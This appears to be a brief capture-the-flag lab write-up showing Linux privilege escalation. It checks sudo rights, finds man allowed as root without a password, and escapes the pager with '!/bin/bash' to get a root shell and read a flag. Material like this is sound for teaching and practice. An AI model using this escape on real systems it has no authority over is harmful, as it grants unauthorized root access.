# Priv Esc through man page with run as root without password

Find programs with setuid - nothing found

```
student@attackdefense:~$ find / -user root -perm 4000 -exec ls -ldb {} \;
find: '/proc/tty/driver': Permission denied
find: '/proc/12/task/12/fd/12': No such file or directory
find: '/proc/12/task/12/fdinfo/12': No such file or directory
```

Check sudoers file - we can run man page as root without password

```
student@attackdefense:~$ sudo -l
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /usr/bin/man
```

Run as root and execute /bin/bash

```
student@attackdefense:~$ sudo man ls
LS(1)                                                     User Commands                                                     LS(1)

NAME
       ls - list directory contents
...
       -F, --classify
              append indicator (one of */=>@|) to entries

!/bin/bash
root@attackdefense:~# id
uid=0(root) gid=0(root) groups=0(root)
root@attackdefense:~# cat /root/flag
74f5cc752947ec8a522f9c49453b8e9a
```
